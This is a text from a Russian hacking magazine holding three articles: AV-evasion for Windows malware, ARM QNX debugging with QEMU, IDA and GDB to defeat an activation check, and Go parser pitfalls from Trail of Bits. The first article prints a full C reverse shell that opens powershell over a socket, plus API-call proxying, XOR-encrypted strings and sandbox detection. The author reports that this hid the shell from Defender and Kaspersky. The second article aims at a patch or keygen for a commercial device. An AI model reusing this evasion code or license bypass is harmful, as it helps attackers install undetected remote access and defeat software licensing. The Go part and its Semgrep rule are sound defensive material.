Про тотипы и сами функции лежат в файле proxy_funck.с .
   Теперь нужно изменить наименования. Для этого я написал простой
скрипт на  Python, и  теперь обфусци рован ная функция проксирова ния
ProxyGetSystemInfo выглядит так:


void hkgnxQepjmjsmmndk(LPSYSTEM_INFO qvkajTyhuqevm) {


    typedef void(WINAPI* fldzzGflcclknthgw)(LPSYSTEM_INFO);
    char ydvyzAfgwfvmcefnzj[] = { 'G','e','t','S','y','s','t','e','m'
,'I','n','f','o','\0' };
    char mcfdgNqypgvahfal[] = { 'k','e','r','n','e','l','3','2','.',
'd','l','l','\0' };
    HMODULE yinkaJpaggo = LoadLibraryA(mcfdgNqypgvahfal);
    fldzzGflcclknthgw mbiloJfyaumc = (fldzzGflcclknthgw)
GetProcAddress(yinkaJpaggo, ydvyzAfgwfvmcefnzj);


    if (mbiloJfyaumc != NULL) {
        mbiloJfyaumc(qvkajTyhuqevm);
    } else {
        // printf("Error: GetSystemInfo function not found!\n");
        exit(1);
    }


    FreeLibrary(yinkaJpaggo);
}

Смот рим, есть ли какое-то упомина ние о GetSystemInfo в файле:


strings main.exe | grep GetSystemInfo

Отлично. На самом деле обфусцировать переменные, которые находятся
внут ри функций (то есть локальные), нет смысла, они все равно не отобража -
ются при ста тическом ана лизе файла. Глав ное — обфусцировать име на фун -
кций, а также строковые данные.
   Строковые данные мы будем сох ранять как мас сивы char, таким образом
они не сох раняются, как обычные стро ки.
  Бы ло:


const char *ip = "192.168.5.52";

Ста ло:


    const char temp_ip[] = { '1','9','2','.','1','6','8','.','5','.',
'5','2','\0' };


    const char *ip = temp_ip;


ÒÅÑÒÈÐÓÅÌ!

Для начала нужно провести тес товую про верку с обычным файлом, чтобы
посмотреть, как поведут себя анализи руемые среды. Вот код программы,
которую мы будем тес тировать:


#include <stdio.h>


int main()
{
    char command[] = "powershell";
    printf("command: %s\n", command);
    return 0;
}

В том, что не будет ложнополо жительных резуль татов, уверенности не было
с самого начала.





Начнем c реаль ных машин. К сожале нию, у меня не так много тестовых компь-
ютеров, поэтому я провел всего два тес та. При запус ке, как и должно было
получиться, при лете ли отстуки со следующими име нами:



  id: Tapping
  ('user_ip', None)
  ('user_agent', 'WinInet_Post')
  ('date', '<date>')
  ('Width', <width>)
  ('Longitude', <longitude>)
  ('hostname', '\x0fDESKTOP-VAJCHE')
  status code: 0


  id: Tapping
  ('user_ip', None)
  ('user_agent', 'WinInet_Post')
  ('date', '<date>')
  ('Width', <width>)
  ('Longitude', <longitude>)
  ('hostname', '\x0fDESKTOP-AATCVQ')
  status code: 0


А теперь реаль ные тес ты!


VirusTotal
В первую оче редь я решил протестировать VirusTotal .





А вот и проверка в песочницах.





Как видно, те функции, которые мы прок сирова ли из DLL, здесь не зас -
ветились.





И тут моего IP нет (это трафик из Microsoft Sysinternals).





Kaspersky
А вот резуль таты динамического сканирования от Kaspersky.





Ста тический ана лиз также не выявил, какие функции Win32 API исполь -
зовались в программе.





Запросов в интернет тоже не было.





                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



               ДЕТЕКТИМ СЭНДБОКСЫ
          VIRUSTOTAL И KASPERSKY, ЧТОБЫ
          СПРЯТАТЬ ВРЕДОНОСНЫЙ КОД




В итоге я не получил ни одного запроса. Можно сде лать вывод, что песоч -
ницы были обнаружены и программа занялась под счетом чисел. Но мою
программу сложно наз вать точно работающей, потому как выборка на реаль -
ных физичес ких машинах слишком мала, чтобы уверенно говорить о резуль -
тате. Нап ример, изначаль но при обнаруже нии вир туального MAC-адреса я
начислял семь баллов, но потом изме нил на четыре, так как в реальной
машине может присутствовать виртуальный адап тер Hyper-V Virtual Ethernet
Adapter. Но все же резуль татом я доволен.
  Од нако у нас не исполь зовалось никакой реаль но зловредной полезной
нагрузки. Как насчет сокрытия чего-то «такого»? Для примера возьмем
reverse shell с сай та revshells.com , а именно код для Windows на C. Модифи -
цирую его, чтобы в слу чае, если программа не сможет под клю читься, она
предприняла еще одну попытку позже:


#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")


WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
char ip_addr[16] = "ip";
char port[6] = "port";
STARTUPINFO ini_processo;


PROCESS_INFORMATION processo_info;


int main()
{
  int i = 0;
  while ( i == 0 ){


    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0
);



    struct hostent *host;
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr
)));


    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);


    int result;
    result = WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL,
NULL, NULL, NULL);


    if (result != -1) {
      memset(&ini_processo, 0, sizeof(ini_processo));
      ini_processo.cb = sizeof(ini_processo);
      ini_processo.dwFlags = STARTF_USESTDHANDLES |
STARTF_USESHOWWINDOW;
      ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo
.hStdError = (HANDLE)Winsock;


      TCHAR cmd[255] = TEXT("powershell.exe");


      CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &
ini_processo, &processo_info);
      i = 1;
      }
    else
      Sleep(60000);
  }


  return 0;
}

Этот код я уже све тил на VirusTotal и Kaspersky, поэтому он должен детек титься
как зловредный.
  Все функции мы также проксиру ем, строковые переменные видоизме няем
в массивы. Теперь, если вир туаль ная сре да не будет обнаруже на, должен
прилететь POST-запрос с Hostname машины и за ним устанавливаться под -
клю чение reverse shell.
   Так выглядит под клю чение с реальной машины.





VirusTotal
Вот результат тес тирова ния программы с полезной наг рузкой на VirusTotal .





Kaspersky
А вот резуль таты проверки в инфраструктуре Kaspersky.





А теперь про тес тиру ем прог раммы с вклю ченным антивирусом на компьюте -
ре.
  Для тес тов у меня их будет все го два: Microsoft Defender и Kaspersky.
Для начала про тес тиру ем с Defender’ом.





Запус каю скрипт и жду подключения. И я его получил!





Теперь делаем то же самое, толь ко с Kaspersky Endpoint Security.





И он тоже промолчал: удаленная машина под клю чилась к серверу.





Но частично функции обхода песочниц анти вирус все-таки обнаружил.





По этому я решил зашифровать строки c использованием XOR и посмотреть,
что  будет.  Например,  так  теперь  выглядит  проксирование  функции
GetSystemInfo :


void ProxyGetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {
    // Создаем тип pGetSystemInfo, который представляет указатель на
функцию, принимающую указатель на SYSTEM_INFO и не возвращающую
значение. Это позволит динамически загружать функцию GetSystemInfo
    typedef void(WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);


    // Ключ для дешифровки зашифрованных имен
    const char *key =
"DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";


    // Зашифрованное имя функции "GetSystemInfo"
    // char funcName[] = "GetSystemInfo";
    // char funcName[] = { 'G','e','t','S','y','s','t','e','m','I',
'n','f','o','\0' };
    char funcName[14] = {0x03, 0x23, 0x31, 0x04, 0x29, 0x24, 0x24,
0x21, 0x3E, 0x19, 0x28, 0x23, 0x3F, 0x00};
    Xor_Dencrypt(funcName, strlen(funcName), key);


    // Зашифрованное имя библиотеки "kernel32.dll"
    // char name_dll[] = "kernel32.dll";
    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d',
'l','l','\0' };
    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63,
0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00};
    Xor_Dencrypt(name_dll, strlen(name_dll), key);


    // Загружаем дескриптор библиотеки kernel32.dll, которая
содержит GetSystemInfo
    HMODULE hKernel32 = LoadLibraryA(name_dll);


    // Получаем адрес функции GetSystemInfo в этой библиотеке
    pGetSystemInfo GetSystemInfoFunc = (pGetSystemInfo)GetProcAddress
(hKernel32, funcName);


    // Если функция загружена, вызываем ее
    if (GetSystemInfoFunc != NULL) {
        // Вызов функции GetSystemInfo
        GetSystemInfoFunc(lpSystemInfo);
    } else {
        // printf("Error: GetSystemInfo function not found!\n");
        exit(1);
    }


    // Освобождаем загруженную библиотеку
    FreeLibrary(hKernel32);
}

По лученный резуль тат обнадеживает.





Ушло упоминание об anti-analysis.





А вот резуль тат от Kaspersky.





Ни один зап рос так и не прилетел. В общем, Symantec обойти тоже не уда -
лось. Как я понял, это широко исполь зуемое за рубежом антивирус ное ПО,
но про него мне вообще почти ничего не извес тно. Так же Deep Instinct,
SecureAge и  Elastic пометили наг рузку как зловредную. Но полученный
резуль тат лучше, чем без шифрования строк.


ÂÛÂÎÄÛ

Этим примером я хотел продемонс три ровать, что лучшим анти вирусным
решением до сих пор оста ется светлая голова: далеко не всегда антивирус -
ные решения, а также анализа торы могут обна ружить зловреды. И нет, я
не говорю, что анти виру сы не нужны: сам сижу с вклю ченным антивиру сом
и при этом в свое время умуд рился словить майнер. Лучше придерживаться
баналь ного правила: не запускать подозритель ные программы, посколь ку
даже их проверка на виртуальных машинах или на таких сайтах, как VirusTotal,
не даст стопроцен тной гарантии безопас ности.
ВЗЛОМ





Когда x86 и Windows уже приелись, а уют -
ный x64dbg боль ше не раду ет глаз, пора
переходить к настоящему хардкору. ARM,
QNX, эму лятор QEMU и старый доб рый
GDB —  вот  инструменты  для  тех,  кто            JaboHack
не ищет лег ких путей. Сегодня мы запус тим
экзо тичес кую ОС, под ключимся к ней через
виртуаль ный адаптер и шаг за шагом раз -
берем логику программы пря мо на лету,
без лишнего комфорта, но с изрядной
долей азарта.


Ты, вероятно, уже заметил, что большинс тво моих статей посвящено разбору
задач под Windows на процес сорах семейства Intel. Это нехорошо, и я изо
всех сил стараюсь раз нообразить тематику иссле дованием экзотических
виртуальных машин и процессоров.
  Виртуалки, каюсь, мною охвачены в меньшей сте пени по весь ма ува -
житель ной причине: задачи под них очень неудобно отлаживать в динамике
и приходит ся огра ничиваться статичес ким анализом. Однако при желании
всег да можно найти выход, даже такой нес тандар тный, как использование
различных эмуляторов. Ты, вероятно, пом нишь мои статьи, пос вящен ные эму -
лято рам SheepShaver для Mac OS или BlueStacks под Android . На этот раз я
хочу обра тить твое внимание на легендарный эму лятор QEMU , при помощи
которого мы будем ана лизи ровать при ложения, реализованные под ARM
QNX.
  До этого мы уже сталкивались и с ARM , но иссле довали его исключитель -
но в дизас семблере, сегодня у нас появилась счас тливая воз можность про -
щупать его в динами ке, причем на PC и даже из-под Windows.
   Возьмем  в  качес тве паци ента некое  устрой ство, функционирующее
под опе раци онной сис темой QNX на процес соре ARM. Из эти ческих сооб -
ражений не будем рас крывать название программы и подробности о спе -
цифи ке ее работы, так же оста вим за скоб ками процесс снятия дампа с это го
приложе ния. Кроме того, я не буду отвле кать ся на процесс установки QEMU
и заг рузки образа, об этом написано много ста тей .
  По усло вию нашей задачи файловая сис тема устройства уже загружена
в QEMU и успешно там функци они рует. В окончатель ной формулировке наша
цель выглядит так: путем патча или кей гена добить ся валидности активаци -
онного кода (на скриншоте выделе но голубым) в активационной строке
(выделено красным), которую скар мли вают прог рамме при помощи спе -
циаль ного акти ваци онного Lua-скрип та. На пред ставленном ниже изоб -
ражении результат провер ки выделен жел тым.





Начнем с под ключения отладчи ка GDB. Об этом тоже написано много разных
ста тей, но почему-то все они как-то стыдливо умалчивают о нас тройке
сетево го под клю чения. У неподготовленного поль зовате ля может сло житься
ложное впечат ление, что опции -s -S вполне достаточно, чтобы GDB увидел
QEMU по 1234-му порту.
  На самом деле это, конечно, не так, поэтому чуть подробнее остановлюсь
на подклю чении отладчи ка через вир туальный сетевой адаптер. Лично у меня
получи лось подклю чить толь ко  так. На сай те QEMU описан ный способ
показан в отдель ной статье , я же поп робую своими словами на пальцах объ -
яснить пошаговую пос ледова тельность действий, необ ходимых для его
реали зации, поскольку она не сов сем очевидна.
  Для начала нам тре буется создать новое сетевое подклю чение с именем
tap0 (Панель управления   Сеть и Интернет   Сетевые подклю чения).





Создать его тоже не так-то прос то: лично у меня это получилось только путем
установ ки OpenVPN . Соз дав виртуальный адап тер, мы прописы ваем у него
в нас трой ках следующую информацию.





После этого добавляем в командную строку QEMU опцию -nic  tap,
ifname=tap0,id=hub0 , и можно тестировать под клю чение отладчиков к эму -
лято ру. Я понимаю, что ты уже при вык к удобному уютному x64dbg и, самое
смешное, что с его помощью тоже можно отлаживать при ложения в эмулято -
ре, но мы, наверное, оставим такую странную экзотику для какой-нибудь сле -
дующей статьи. В этот раз мы начнем с самого удобного способа отладки —
при помощи уже хорошо известного нам дизассембле ра IDA.
  Для тебя, вероятно, уже не новость, что этот дизас семблер оснащен собс -
твенным отладчиком. Хотя, конечно, все универ саль ное хуже спе циального,
и он сильно проигры вает в удобс тве и надежности x64dbg. Но в дан ном слу -
чае это самое меньшее из всех зол.
  Вообще-то процесс под ключения IDA к QEMU через GDB подробно и с
цветными картинка ми описан на сайте Hex-Rays , одна ко я снова поп робую
изложить его своими словами, пос коль ку там тоже есть нюансы.
   Итак, после описан ной выше нас тройки QEMU и его запуска мы вводим
в его консоль коман ду pdebug 1234 . Затем открываем в IDA меню Debugger
   Attach   Remote GDB debugger и переходим к окну настро ек подключения,
в которое  (исходя  из выбранных выше нас троек) вводим следующую
информа цию.





Да лее в окне GDB conguration (Debugger options   Set specic options) нуж -
но обязатель но ука зать тип процессора (в нашем случае это ARM  Little-
endian), иначе IDA, скорее все го, рухнет при атта че.





Однако при попыт ке под ключения IDA просит имя или PID запущенного в эму -
лято ре процесса, а нам он неиз вестен, и спи сок выбора пус той.





При попытке выбрать про цесс 0 IDA успешно коннектится к эмулято ру,
и хотя бы это радует: значит, мы всё сделали пра виль но.





Попробуем все-таки определить, какой именно процесс обрабаты вает наш
зап рос. Для начала посмотрим список запущенных в QEMU процессов.
К сожалению, в QNX нет при вычной коман ды ps , зато есть pidin ar , которая
выводит иско мое.





                       Список процес сов

По счастью, про цессов обна ружи лось немного. Раз берем ся, какой из них нам
нужен. На самом первом скриншоте жел тым цветом выделен результат про -
верки валид ности. Вероятно, подстрока validState: присутству ет в нужном
нам модуле. Начиная провер ку сни зу спис ка, мы сразу обнаруживаем его
поиском grep . Вытаскиваем этот модуль и заг ружаем в IDA — искомая строка
дей ствитель но там есть.





По идее, на этом нашу задачу уже можно было бы считать решенной, ведь
дос таточ но закоротить провер ку


if ( *a2 )

на безус ловный переход:


v3 = 1;

Но мы попробуем доискать ся до исходной про верки, ведь эта функция может
оказаться лишь отла доч ной печатью ста туса. По лис тингу видно, что валид -
ность кода зависит от парамет ра a2 , переда ваемого в функцию: если он ука -
зыва ет на 0 — код валид ный. Параметр a2 передается в sub_1183F8 через
регистр R1 , одна ко неп росто понять, откуда он берется: прямых ссылок
на sub_1183F8 нет.





Хороший повод про верить отладчик! Ста вим точ ку останова (F2) на адрес
1183F8 и нажима ем Debugger   Attach to process. Если мы всё сде лали пра -
виль но, то IDA успешно подключится к про цессу, который будет отоб ражаться
синим цветом в зеленой полоске наверху окна.





Если что-то пой дет не так и IDA будет ругаться при под клю чении, ссы лаясь
на права доступа и про чую ерунду, просто проверь правиль ность адресов
и настроек в окне Debugger   Process options.
  Жмем Debugger    Continue process (F9), и на экране появится окошко
Running с единс твенной кнопочкой Suspend. После этого в кон соли QEMU
запус каем активационный скрипт — процесс притормозит на нашей точке
останова. По стеку (окно вни зу спра ва) определяем адрес воз вра та 4FD1D4.





Попробуем пре обра зовать это мес то в псевдокод.





Функция sub_1183F8 вызыва ется из sub_4FD0DC , ее второй параметр тут
называ ется v12. По этому указателю прис ваивается значение a2 , по сов -
падению явля ющееся вторым параметром sub_4FD0DC . Судя по сооб щению
дву мя строками выше это го присваивания, a2 — это результат активации, что
выг лядит вполне логично: 0 — успешная акти вация, иначе возвращается
номер ошиб ки (в нашем слу чае — 2). Под нявшись чуть выше по стеку возвра -
тов, мы находим место вызова sub_4FD0DC .





По хоже, мы отыскали обра бот чик оши бок акти вации и правильную ветку кода,
на которой акти вация проходит успешно  ( sub_4FD0DC(a1,  0); ). В даль -
нейшее мы не будем углубляться, пос кольку осталась чисто техническая
часть: или закоротить данную функцию сра зу на исполне ние коррек тной вет -
ки, или (что более пра виль но) искать и ревер сить алгоритм верификации
активаци онного кода, чтобы сделать кейген.
  К теме нашей статьи это уже отношения не име ет, поэтому в заключение я
лучше расскажу тебе, как проходить эту последовательность в том случае,
если IDA по какой-либо при чине не уви дит QEMU. К сожалению, такая воз -
можность вполне неиллюзор на, и внятных объ яснений в сети я не нашел,
поэтому тебе всегда нужно быть готовым к настоящему хардкору — отладке
при помощи голого отладчи ка GDB. Попробуем пошагово повторить описан -
ный процесс.
  Сра зу предуп реждаю, что этот путь сложен и тернист, трудности подсте -
регают уже в самом его начале — получить сам отладчик GDB под ARM
и QNX. Это свободное откры тое программное обеспечение, рас простра -
няющееся в исходниках (ска чать можно здесь ), одна ко самому собрать
бинарник из лежащих там исходни ков — тот еще квест, для решения которого
рамки этой статьи тес ны.
  На чаль ное направление мож но получить, нап ример, на Stack Overow,
а мы пред полага ем, что у нас уже имеется скомпилирован ный бинар ник этого
отладчи ка под нашу версию процес сора. В этом случае после описанных
выше нас тро ек эму лятора QEMU, его запуска и ввода в консоль коман ды
pdebug 1234 запускаем GDB в другом окне и в нем набираем коман ду под -
клю чения:


target qnx 192.168.1.200:1234

Если мы ничего не напутали, в окне GDB появится сле дующее сообщение.





Теперь нам снова требуется подклю читься к нужному про цессу из отладчика
GDB. На скрин шоте со списком процессов мы определили PID нужного про -
цес са — 512024. Для подклю чения к нему в консоли GDB набираем коман ду


attach 512024





Не обращаем внимания на многочис ленные сооб щения об ошибках, GDB
успешно под клю чился к про цессу 512024 и, так же как и в IDA, остановился
на промежуточной точке оста нова 1037878 . Эмулятор в момент останова
тоже замерзнет, а мы вос поль зуем ся паузой, чтобы (как было продела но
выше) пос тавить точку оста нова на адрес 1183F8. Позволю себе маленькое
лиричес кое отступление про особенности отладчи ка GDB.
   Как я уже говорил, процесс отладки приложения в отладчике GDB дос -
таточно экзотичен. GDB, как ты уже понял, полностью лишен гуя и управля ется
исключитель но командами из консоли. В этом он больше все го напоминает
DOS’овский отладчик debug.com, в котором мне, как хакеру старой школы,
в свое время при ходилось мно го и кропот ливо работать. С пол ным справоч -
ником команд GDB можно озна комить ся на sourceware.org или opennet.ru ,
в дан ный момент нас интересуют команды останова .
  Даже бегло ознакомившись с опциями точек останова GDB, ты понима -
ешь, что, несмотря на край нюю нед ружествен ность к пользователю, это очень
гиб кий инс тру мент, воз можнос ти которо го не уступают условным точкам
останова x64dbg, а кое-где даже превос ходят их. Здесь на каждую точку оста -
нова можно повесить весьма сложные скрипты, нас траивающие выполнение
программы в отладчи ке по воле и фантазии поль зователя. А из них даже мож -
но вызывать функции и блоки кода, реали зованные в приложе нии, однако
это тоже тема для отдельной статьи. Сей час нам нужно простые точки оста -
нова на адресе 1183F8:


b *0x1183F8

Вроде все просто и понятно, звез дочка перед адресом означает, что сле -
дующая за ней строка 0x1183F8 — это именно шестнад цатерич ный адрес,
а не иден тифика тор из таблицы отладочных символов, которую мы не под клю -
чили к отладчику, потому что у нас ее попросту нет. Далее командой c
(continue) мы раз мораживаем QEMU (отладчик при этом, наоборот, замирает
в ожи дании точки оста нова) и в консоли QEMU запускаем акти вационный
скрипт.





Как видишь, по дос тижении адре са 1183F8 точка останова сработа ла, мы
останови лись на ней в GDB, а выполнение прог раммы в QEMU снова замер -
ло. При оста новив программу, мы можем делать свои дела: например, пос -
мотреть код, на котором мы остановились. Чтобы показать пять дизас сем -
бли рованных команд по адресу из регис тра PC , набираем в GDB x/5i $pc
и получа ем такой листинг:



  (gdb) x/5i $pc
  0x1183f8:       push    {r4, r5, r6, r7, r8, r10, r11, lr}
  0x1183fc:       add     r11, sp, #28    ; 0x1c
  0x118400:       sub     sp, sp, #64     ; 0x40
  0x118404:       ldr     r3, [pc, #324]  ; 0x118550
  0x118408:       mov     r4, r0
  (gdb)


Нам нужен был стек воз вра тов? Набира ем x/4x $sp, получаем четыре вер -
хних значения на стеке:


0xfffb18:       0x00fffb5c      0x004fd1d4      0x006c382c
0x005777b8

Посмотреть зна чение нуж ного регистра мож но командой print $r0. Сде лать
шаг вперед — коман дами stepi или nexti (не путать с командами step
и next , которые у нас не будут работать из-за отсутствия под гру женной таб -
лицы символов). Если же надо продол жить работу, остановившись на адресе
118408, не устанавливая на нее дополнительную точку останова, пишем


u *0x118408

Крат кий дай джест осо бо часто используемых команд можно посмотреть
на «Xаб ре» . Как видишь, при определенной сноров ке и усидчивости мож но
прекрасно обойтись и без под ключения к отладке IDA. Напоследок приведу
пару статей, в которых отладчик GDB исполь зуется для анализа других задач.




                    •По шаговая   GDB-отладка   ARM-процессора
                         из консоли в Win10
                     •Хар дкорный олдскул: QEMU и реверс образа
                      флоппика


В общем, для пытливого ума экзотичность железа и процессора не станут
препятс тви ем к отладке и динамическому анализу приложений в привычной
операционной сис теме.
ВЗЛОМ





Парсинг ненадеж ных данных создает идеальную лазейку
для атак на приложе ния, написанные на Go. В ходе наших
исследова ний безопасности мы не раз находи ли уязвимости
в парсерах JSON, XML и YAML Go, позволявшие обходить
аутентификацию,  нарушать   авторизационные  правила
и выкачивать чувстви тель ные данные пря мо с рабочих сис -
тем.



Это близ кий к тексту пересказ статьи « Unexpected security footguns in Go’s
parsers » из блога Trail of Bits. Ее автор — Вас ко Франко . Материал дос тупен
без плат ной под писки.



Это не просто теоре тические баги — они уже привели к реальным уяз вимос -
тям, таким как CVE-2020-16250 (обход аутентификации в HashiCorp Vault,
который обна ружи ли ребята из Google Project Zero), и множеству кри тических
находок в проектах наших кли ентов.
   Здесь мы рас ска жем об этих неожидан ных глю ках парсеров и приведем
три сценария ата ки, которые должен знать каждый инже нер по безопасности
и разработчик на Go.
 1. (Äå)ñåðèàëèçàöèÿ íåîæèäàí íûõ äàí íûõ : как парсеры на Go могут рас -
   крыть дан ные, которые разработчики планировали оставить приватными.
 2. Ðàç ëè÷èÿ ïàðñåðîâ : как несовпадения в работе разных парсеров поз -
   воля ют хакерам обходить меры безопасности, ког да несколько сервисов
   обрабатывают одинаковые данные.
 3. Ïó òàíèöà â ôîðìàòàõ äàí íûõ: как парсеры обрабаты вают межформат -
  ные данные с неожиданными и порой весьма взры воопас ными резуль -
   татами.

Мы покажем каждый сце нарий атаки на при мере из реаль ной жизни и завер -
шим все конкрет ными рекомендациями о том, как безопаснее использовать
парсинг. В том чис ле рас скажем, как затыкать дыры в безопасности стан дар -
тной биб лиотеки Go.
   Вот крат кий обзор неожи данных поведений, которые мы рассмот рим,
с инди каторами.


 Îñî áåí íîñòü   JSON     JSON v2   XML      YAML

                Да         Да         Да         Да
  json:"-,"            (плохой      (плохой      (плохой      (плохой
                    дизайн)      дизайн)      дизайн)      дизайн)

                Да         Да         Да         Да
  json:"omitempty"     (как и ожи -   (как и ожи -   (как и ожи -   (как и ожи -
                    далось)      далось)      далось)      далось)

                Да                   Да
 Дуб лирующиеся
                    (пос -        Нет          (пос -        Нет
 ключи
                   ледний)                   ледний)

 Регис тронеза -
                Да          Нет         Нет         Нет
 виси мость

                Да         Да                   Да
 Неизвес тные
                    (испра -      (испра -     Да           (испра -
 ключи
                   вимо)       вимо)                    вимо)

 Лишние
                  Нет         Нет        Да          Нет
 ведущие данные

                Да
 Лишние дан ные
                       (с          Нет        Да          Нет
 в конце
                   Decoder)


Ïàðñèíã â Go
Да вай раз берем, как Go обра батывает JSON, XML и YAML. В стандартной
биб лиотеке Go найдутся парсеры для JSON и XML, а вот для YAML придет ся
подобрать что-то стороннее — на выбор есть куча реализаций. В этой статье
мы сос редоточимся на таких парсерах:
 • encoding/json , версия go1.24.1;
 • encoding/xml , версия go1.24.1;
 • yaml.v3 , версия  3.0.1, самая популяр ная сторон няя библиоте ка YAML
   для Go.

В наших при мерах будем использовать JSON, но у всех трех парсеров оди -
наковые API, так что раз ницы почти никакой.
  В своей основе эти пар серы выполняют две главные фун кции:
 • Marshal (сериали зация) — прев ращает структуры Go в стро ки заданного
  формата;
 • Unmarshal (десериали зация) — кон верти рует строки фор мата обратно
   в структуры Go.





           Пар синг JSON в Go: как сделать это пра виль но?

В Go есть фишка — теги полей структур, поз воляющие нас троить, как пар -
серы должны работать с отдель ными полями. Вот из чего состоят эти теги:
 • èìÿ êëþ ÷à для сериали зации/десериали зации;
 • опциональ ные äèðåê òèâû ÷åðåç çàïÿòóþ для изменения поведения (нап -
   ример, опция omitempty в JSON указывает сериали затору пропустить
   пустое поле в строке вывода).


type User struct {
    // Поле для имени пользователя в JSON
    Username string `json:"username_json_key,omitempty"`
    // Пароль пользователя
    Password string `json:"password"`
    // Флаг для админа
    IsAdmin  bool   `json:"is_admin"`
}

Чтобы распарсить JSON-стро ку в структуру User , опи сан ную выше, тебе нуж -
но использовать ключ username_json_key для поля Username , password
для поля Password , а для поля IsAdmin — ключ is_admin .


u := User{}
_ = json.Unmarshal([]byte(`{
    "username_json_key": "jofra",
    "password": "qwerty123!",
    "is_admin": "false"
}`), &u)
fmt.Printf("Result: %#v\n", u)
// Результат: User{Username:"jofra", Password:"qwerty123!", IsAdmin:
false}

Эти  парсеры  также  поддержи вают  потоко вые  методы,  работающие
с интерфей сами io.Reader вмес то byte-сре зов. Такой API особен но хорош
для парсинга потоковых данных, нап ример тел HTTP-зап росов, и поэтому
часто применяется в системах обработки HTTP.





             Парсинг JSON в Go с помощью NewDecoder


ÀÒÀÊÀ 1: ÏÎÄÌÅÍÀ ÄÀÍÍÛÕ ÏÐÈ (ÄÅ)ÑÅÐÈÀËÈÇÀÖÈÈ

Иногда нужно ограничить, какие именно поля струк туры могут быть сериали -
зова ны или десериализова ны.
  Давай раз берем простой при мер: есть бэкенд-сервер, на котором нас -
троен HTTP-хендлер для создания поль зователей и еще один — для их извле -
чения после аутентифика ции.
   Ког да создаешь поль зователя, возможно, тебе не захочется, чтобы он мог
задать поле IsAdmin сам (то есть парсить это поле из пользовательского
ввода).





  Взаимодей ствие с бэкенд-сер вером, где пользователь может изменить
  поле IsAdmin в структуре User, — такую возможность давать нель зя

Точно так же при получе нии данных пользователя тебе может не понадобить -
ся воз вращать его пароль или другие секретные зна чения.





  Взаимодей ствие с сервером, где пользователь каким-то образом
  получает дос туп к полю Password в структуре User, хотя это должно быть
  невоз можно

Как можно указать парсерам не сериализовать или десериализовать поле?


Ïîëÿ áåç ìåòîê
Да вай сна чала посмотрим, что произой дет, если ты не установишь тег JSON.


type User struct {
    Username string
}

В этом случае ты можешь распаковать поле Username по его имени,
как показа но ниже.


_ = json.Unmarshal([]byte(`{"Username": "jofra"}`), &u)
// Результат: User{Username:"jofra"}

Это хорошо  задокументирова но, и большинс тво разработ чиков на Go
об этом зна ют. Давай глянем на дру гой пример:


type User struct {
    // Имя пользователя, если не заполнено — не отображается в JSON
    Username string `json:"username,omitempty"`
    // Пароль пользователя, тоже исчезающий в JSON, если пустой
    Password string `json:"password,omitempty"`
    // Флаг того, что пользователь — админ
    IsAdmin  bool
}

Очевид но ли, что поле IsAdmin выше будет десери ализовано? Менее опыт -
ный или невниматель ный разработчик может подумать, что этого не произой -
дет, и так в сис теме обра зуется уяз вимость.
   Ес ли хочешь просканиро вать свой код и обнаружить ситуации, ког да толь -
ко часть полей имеет JSON-, XML- или YAML-теги, используй следующее
Semgrep-пра вило. Оно не попало в наш каталог правил на Semgrep registry,
так как в зависи мос ти от твоего кода велика вероятность получить кучу лож -
ных срабатываний.


rules:
    - id: unmarshaling-tag-in-only-some-fields
      message: >-
          Тип $T1 имеет поля с тегами json/yml/xml только на
некоторых полях, а не на всех. Такое поле все равно может быть (де)
сериализовано по имени. Чтобы предотвратить (де)сериализацию поля,
используй тег -.
      languages: [go]
      severity: WARNING
      patterns:
          - pattern-inside: |
                type $T1 struct {
                  ...
                  $_ $_ `$TAG`
                  ...
                }
          # Этот регекс пытается избежать некоторых ложных
срабатываний, таких как структуры, объявленные внутри структур
          - pattern-regex: >-
                ^[ \t]+[A-Z]+[a-zA-Z0-9]*[ \t]+[a-zA-Z0-9]+[^{`\n\r]
*$
          - metavariable-regex:
                metavariable: $TAG
                regex: >-
                    .*(json|yaml|xml):"[^,-


Íåïðàâèëüíîå èñïîëüçîâàíèå òåãà -
Чтобы зас тавить парсер игнориро вать кон кретное поле при (де)сери али -
зации, добавь спец тег JSON, который выглядит как знак минуса.


type User struct {
    // Имя пользователя в JSON
    Username string `json:"username,omitempty"`
    // Пароль в JSON
    Password string `json:"password,omitempty"`
    // Админские права не добавляются в JSON
    IsAdmin  bool   `json:"-,omitempty"`
}

По еха ли!


_ = json.Unmarshal([]byte(`{"-": true}`), &u)
// Результат: main.User{Username:"", Password:"", IsAdmin:true}

Вот незадача, мы все-таки смогли установить поле IsAdmin . Мы по ошибке
скопировали часть ,omitempty, из-за чего парсер начал искать ключ - в пре -
дос тавлен ном JSON. Я пробежался по топ-1000 репози ториев на Go
на GitHub с наибольшим количес твом звезд и сре ди прочих нашел два таких
случая (и отрапортовал о них, так что их уже испра вили):
 • в Flipt поле ClientID в конфигура ции OIDC отображалось как - (исправ -
   лено в #3658 );
 • в langchaingo поле MaxTokens также отображалось как - (исправлено
   в #1163 ).

Это поведе ние чре вато ошиб ками и не при носит особой пользы (ну кроме
возможности наз вать поле - ), и тем не менее оно описано в документации
пакета JSON .




                    Особый случай: если у тега поля стоит - , то
                        это поле всег да пропус кается. Фокус в том, что
                       поле с име нем - все еще мож но создать, исполь -
                         зуя тег -, .


Парсеры для XML и YAML работа ют похоже, но есть один подвох: XML-парсер
счи тает тег <-> некорректным. Чтобы это испра вить, нуж но добавить для сим -
вола «минус» прос транство имен. Например, превратить его в <A:-> .





